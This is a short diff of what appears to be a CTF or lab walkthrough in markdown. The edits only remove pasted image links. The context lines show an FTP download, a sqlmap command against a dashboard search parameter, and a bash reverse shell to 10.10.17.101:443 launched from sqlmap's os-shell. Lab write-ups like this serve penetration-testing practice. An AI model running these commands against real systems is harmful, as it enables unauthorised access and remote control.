@@ -68,9 +68,6 @@ ftp 10.129.95.174
 ftp> get backup.zip
 ```
 
-![[Pasted image 20251231002954.png]]
-
-
 
 
 
@@ -252,7 +249,7 @@ sqlmap -u "http://10.129.95.174/dashboard.php?search=Elixir" \
 os-shell> bash -c "bash -i >& /dev/tcp/10.10.17.101/443 0>&1"
 ```
 
-![[Pasted image 20251231012848.png]]
+
 
 ### Netcat Listener
 ```
